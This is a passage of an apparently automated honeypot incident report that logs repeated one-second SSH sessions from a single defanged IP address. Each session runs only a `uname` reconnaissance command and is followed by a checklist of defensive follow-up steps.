| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:09:40` | `cowrie.session.connect` |
| `2026-08-14 07:09:40` | `cowrie.client.version` |
| `2026-08-14 07:09:40` | `cowrie.client.kex` |
| `2026-08-14 07:09:41` | `cowrie.login.success` |
| `2026-08-14 07:09:41` | `cowrie.session.params` |
| `2026-08-14 07:09:41` | `cowrie.command.input` |
| `2026-08-14 07:09:41` | `cowrie.log.closed` |
| `2026-08-14 07:09:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d3a52adac87

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:09 |
| **Last Seen** | 2026-08-14 07:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:09:45` | `cowrie.session.connect` |
| `2026-08-14 07:09:45` | `cowrie.client.version` |
| `2026-08-14 07:09:45` | `cowrie.client.kex` |
| `2026-08-14 07:09:45` | `cowrie.login.success` |
| `2026-08-14 07:09:46` | `cowrie.session.params` |
| `2026-08-14 07:09:46` | `cowrie.command.input` |
| `2026-08-14 07:09:47` | `cowrie.log.closed` |
| `2026-08-14 07:09:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-083aad7a0f03

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:09 |
| **Last Seen** | 2026-08-14 07:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:09:49` | `cowrie.session.connect` |
| `2026-08-14 07:09:49` | `cowrie.client.version` |
| `2026-08-14 07:09:50` | `cowrie.client.kex` |
| `2026-08-14 07:09:50` | `cowrie.login.success` |
| `2026-08-14 07:09:51` | `cowrie.session.params` |
| `2026-08-14 07:09:51` | `cowrie.command.input` |
| `2026-08-14 07:09:51` | `cowrie.log.closed` |
| `2026-08-14 07:09:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d7881437ee2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:09 |
| **Last Seen** | 2026-08-14 07:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:09:54` | `cowrie.session.connect` |
| `2026-08-14 07:09:54` | `cowrie.client.version` |
| `2026-08-14 07:09:54` | `cowrie.client.kex` |
| `2026-08-14 07:09:55` | `cowrie.login.success` |
| `2026-08-14 07:09:55` | `cowrie.session.params` |
| `2026-08-14 07:09:55` | `cowrie.command.input` |
| `2026-08-14 07:09:55` | `cowrie.log.closed` |
| `2026-08-14 07:09:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3deac6b1c29

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:09 |
| **Last Seen** | 2026-08-14 07:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:09:59` | `cowrie.session.connect` |
| `2026-08-14 07:09:59` | `cowrie.client.version` |
| `2026-08-14 07:09:59` | `cowrie.client.kex` |
| `2026-08-14 07:09:59` | `cowrie.login.success` |
| `2026-08-14 07:10:00` | `cowrie.session.params` |
| `2026-08-14 07:10:00` | `cowrie.command.input` |
| `2026-08-14 07:10:00` | `cowrie.log.closed` |
| `2026-08-14 07:10:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc53559c51b1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:10 |
| **Last Seen** | 2026-08-14 07:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:10:04` | `cowrie.session.connect` |
| `2026-08-14 07:10:04` | `cowrie.client.version` |
| `2026-08-14 07:10:04` | `cowrie.client.kex` |
| `2026-08-14 07:10:05` | `cowrie.login.success` |
| `2026-08-14 07:10:05` | `cowrie.session.params` |
| `2026-08-14 07:10:05` | `cowrie.command.input` |
| `2026-08-14 07:10:06` | `cowrie.log.closed` |
| `2026-08-14 07:10:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62224679b265

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:10 |
| **Last Seen** | 2026-08-14 07:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:10:09` | `cowrie.session.connect` |
| `2026-08-14 07:10:09` | `cowrie.client.version` |
| `2026-08-14 07:10:09` | `cowrie.client.kex` |
| `2026-08-14 07:10:10` | `cowrie.login.success` |
| `2026-08-14 07:10:11` | `cowrie.session.params` |
| `2026-08-14 07:10:11` | `cowrie.command.input` |
| `2026-08-14 07:10:11` | `cowrie.log.closed` |
| `2026-08-14 07:10:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7171525e130

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:10 |
| **Last Seen** | 2026-08-14 07:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:10:14` | `cowrie.session.connect` |
| `2026-08-14 07:10:14` | `cowrie.client.version` |
| `2026-08-14 07:10:14` | `cowrie.client.kex` |
| `2026-08-14 07:10:15` | `cowrie.login.success` |
| `2026-08-14 07:10:15` | `cowrie.session.params` |
| `2026-08-14 07:10:15` | `cowrie.command.input` |
| `2026-08-14 07:10:16` | `cowrie.log.closed` |
| `2026-08-14 07:10:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba58e40c4247

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:10 |
| **Last Seen** | 2026-08-14 07:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:10:19` | `cowrie.session.connect` |
| `2026-08-14 07:10:19` | `cowrie.client.version` |
| `2026-08-14 07:10:19` | `cowrie.client.kex` |
| `2026-08-14 07:10:19` | `cowrie.login.success` |
| `2026-08-14 07:10:20` | `cowrie.session.params` |
| `2026-08-14 07:10:20` | `cowrie.command.input` |
| `2026-08-14 07:10:20` | `cowrie.log.closed` |
| `2026-08-14 07:10:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3322bd491fdd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:10 |
| **Last Seen** | 2026-08-14 07:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:10:24` | `cowrie.session.connect` |
| `2026-08-14 07:10:24` | `cowrie.client.version` |
| `2026-08-14 07:10:24` | `cowrie.client.kex` |
| `2026-08-14 07:10:24` | `cowrie.login.success` |
| `2026-08-14 07:10:25` | `cowrie.session.params` |
| `2026-08-14 07:10:25` | `cowrie.command.input` |
| `2026-08-14 07:10:25` | `cowrie.log.closed` |
| `2026-08-14 07:10:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7951e630d2a7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:10 |
| **Last Seen** | 2026-08-14 07:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:10:29` | `cowrie.session.connect` |
| `2026-08-14 07:10:29` | `cowrie.client.version` |
| `2026-08-14 07:10:29` | `cowrie.client.kex` |
| `2026-08-14 07:10:29` | `cowrie.login.success` |
| `2026-08-14 07:10:30` | `cowrie.session.params` |
| `2026-08-14 07:10:30` | `cowrie.command.input` |
| `2026-08-14 07:10:30` | `cowrie.log.closed` |
| `2026-08-14 07:10:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c6e756d7764

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:10 |
| **Last Seen** | 2026-08-14 07:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:10:34` | `cowrie.session.connect` |
| `2026-08-14 07:10:34` | `cowrie.client.version` |
| `2026-08-14 07:10:34` | `cowrie.client.kex` |
| `2026-08-14 07:10:34` | `cowrie.login.success` |
| `2026-08-14 07:10:35` | `cowrie.session.params` |
| `2026-08-14 07:10:35` | `cowrie.command.input` |
| `2026-08-14 07:10:35` | `cowrie.log.closed` |
| `2026-08-14 07:10:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3274795182b3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:10 |
| **Last Seen** | 2026-08-14 07:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:10:38` | `cowrie.session.connect` |
| `2026-08-14 07:10:38` | `cowrie.client.version` |
| `2026-08-14 07:10:38` | `cowrie.client.kex` |
| `2026-08-14 07:10:39` | `cowrie.login.success` |
| `2026-08-14 07:10:40` | `cowrie.session.params` |
| `2026-08-14 07:10:40` | `cowrie.command.input` |
| `2026-08-14 07:10:40` | `cowrie.log.closed` |
| `2026-08-14 07:10:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-866528701291

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:10 |
| **Last Seen** | 2026-08-14 07:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:10:43` | `cowrie.session.connect` |
| `2026-08-14 07:10:43` | `cowrie.client.version` |
| `2026-08-14 07:10:43` | `cowrie.client.kex` |
| `2026-08-14 07:10:43` | `cowrie.login.success` |
| `2026-08-14 07:10:44` | `cowrie.session.params` |
| `2026-08-14 07:10:44` | `cowrie.command.input` |
| `2026-08-14 07:10:44` | `cowrie.log.closed` |
| `2026-08-14 07:10:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b506abb74d16

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:10 |
| **Last Seen** | 2026-08-14 07:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:10:48` | `cowrie.session.connect` |
| `2026-08-14 07:10:48` | `cowrie.client.version` |
| `2026-08-14 07:10:48` | `cowrie.client.kex` |
| `2026-08-14 07:10:48` | `cowrie.login.success` |
| `2026-08-14 07:10:49` | `cowrie.session.params` |
| `2026-08-14 07:10:49` | `cowrie.command.input` |
| `2026-08-14 07:10:49` | `cowrie.log.closed` |
| `2026-08-14 07:10:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91784f63def9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:10 |
| **Last Seen** | 2026-08-14 07:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:10:52` | `cowrie.session.connect` |
| `2026-08-14 07:10:52` | `cowrie.client.version` |
| `2026-08-14 07:10:52` | `cowrie.client.kex` |
| `2026-08-14 07:10:53` | `cowrie.login.success` |
| `2026-08-14 07:10:54` | `cowrie.session.params` |
| `2026-08-14 07:10:54` | `cowrie.command.input` |
| `2026-08-14 07:10:54` | `cowrie.log.closed` |
| `2026-08-14 07:10:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-909a2458cc9a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:10 |
| **Last Seen** | 2026-08-14 07:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:10:57` | `cowrie.session.connect` |
| `2026-08-14 07:10:57` | `cowrie.client.version` |
| `2026-08-14 07:10:57` | `cowrie.client.kex` |
| `2026-08-14 07:10:58` | `cowrie.login.success` |
| `2026-08-14 07:10:59` | `cowrie.session.params` |
| `2026-08-14 07:10:59` | `cowrie.command.input` |
| `2026-08-14 07:10:59` | `cowrie.log.closed` |
| `2026-08-14 07:10:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7c90350d59e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:11 |
| **Last Seen** | 2026-08-14 07:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:11:02` | `cowrie.session.connect` |
| `2026-08-14 07:11:02` | `cowrie.client.version` |
| `2026-08-14 07:11:02` | `cowrie.client.kex` |
| `2026-08-14 07:11:02` | `cowrie.login.success` |
| `2026-08-14 07:11:03` | `cowrie.session.params` |
| `2026-08-14 07:11:03` | `cowrie.command.input` |
| `2026-08-14 07:11:04` | `cowrie.log.closed` |
| `2026-08-14 07:11:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b9b7a973769

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:11 |
| **Last Seen** | 2026-08-14 07:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:11:07` | `cowrie.session.connect` |
| `2026-08-14 07:11:07` | `cowrie.client.version` |
| `2026-08-14 07:11:07` | `cowrie.client.kex` |
| `2026-08-14 07:11:07` | `cowrie.login.success` |
| `2026-08-14 07:11:08` | `cowrie.session.params` |
| `2026-08-14 07:11:08` | `cowrie.command.input` |
| `2026-08-14 07:11:08` | `cowrie.log.closed` |
| `2026-08-14 07:11:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6243487ab1a2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:11 |
| **Last Seen** | 2026-08-14 07:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:11:12` | `cowrie.session.connect` |
| `2026-08-14 07:11:12` | `cowrie.client.version` |
| `2026-08-14 07:11:12` | `cowrie.client.kex` |
| `2026-08-14 07:11:12` | `cowrie.login.success` |
| `2026-08-14 07:11:13` | `cowrie.session.params` |
| `2026-08-14 07:11:13` | `cowrie.command.input` |
| `2026-08-14 07:11:13` | `cowrie.log.closed` |
| `2026-08-14 07:11:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9d6cb2713f2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:11 |
| **Last Seen** | 2026-08-14 07:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:11:17` | `cowrie.session.connect` |
| `2026-08-14 07:11:17` | `cowrie.client.version` |
| `2026-08-14 07:11:17` | `cowrie.client.kex` |
| `2026-08-14 07:11:18` | `cowrie.login.success` |
| `2026-08-14 07:11:18` | `cowrie.session.params` |
| `2026-08-14 07:11:18` | `cowrie.command.input` |
| `2026-08-14 07:11:19` | `cowrie.log.closed` |
| `2026-08-14 07:11:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b114587b828

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:11 |
| **Last Seen** | 2026-08-14 07:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:11:22` | `cowrie.session.connect` |
| `2026-08-14 07:11:22` | `cowrie.client.version` |
| `2026-08-14 07:11:22` | `cowrie.client.kex` |
| `2026-08-14 07:11:22` | `cowrie.login.success` |
| `2026-08-14 07:11:23` | `cowrie.session.params` |
| `2026-08-14 07:11:23` | `cowrie.command.input` |
| `2026-08-14 07:11:23` | `cowrie.log.closed` |
| `2026-08-14 07:11:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7426b9b94efb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:11 |
| **Last Seen** | 2026-08-14 07:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:11:27` | `cowrie.session.connect` |
| `2026-08-14 07:11:27` | `cowrie.client.version` |
| `2026-08-14 07:11:27` | `cowrie.client.kex` |
| `2026-08-14 07:11:27` | `cowrie.login.success` |
| `2026-08-14 07:11:28` | `cowrie.session.params` |
| `2026-08-14 07:11:28` | `cowrie.command.input` |
| `2026-08-14 07:11:28` | `cowrie.log.closed` |
| `2026-08-14 07:11:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3d2c32305b1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:11 |
| **Last Seen** | 2026-08-14 07:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:11:31` | `cowrie.session.connect` |
| `2026-08-14 07:11:31` | `cowrie.client.version` |
| `2026-08-14 07:11:31` | `cowrie.client.kex` |
| `2026-08-14 07:11:32` | `cowrie.login.success` |
| `2026-08-14 07:11:33` | `cowrie.session.params` |
| `2026-08-14 07:11:33` | `cowrie.command.input` |
| `2026-08-14 07:11:33` | `cowrie.log.closed` |
| `2026-08-14 07:11:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-addab819f4e3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:11 |
| **Last Seen** | 2026-08-14 07:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:11:36` | `cowrie.session.connect` |
| `2026-08-14 07:11:36` | `cowrie.client.version` |
| `2026-08-14 07:11:36` | `cowrie.client.kex` |
| `2026-08-14 07:11:36` | `cowrie.login.success` |
| `2026-08-14 07:11:37` | `cowrie.session.params` |
| `2026-08-14 07:11:37` | `cowrie.command.input` |
| `2026-08-14 07:11:37` | `cowrie.log.closed` |
| `2026-08-14 07:11:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f72f72fd0a1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:11 |
| **Last Seen** | 2026-08-14 07:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:11:40` | `cowrie.session.connect` |
| `2026-08-14 07:11:40` | `cowrie.client.version` |
| `2026-08-14 07:11:40` | `cowrie.client.kex` |
| `2026-08-14 07:11:41` | `cowrie.login.success` |
| `2026-08-14 07:11:42` | `cowrie.session.params` |
| `2026-08-14 07:11:42` | `cowrie.command.input` |
| `2026-08-14 07:11:42` | `cowrie.log.closed` |
| `2026-08-14 07:11:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92570fa76ba4

| Field | Detail |
|---|---|
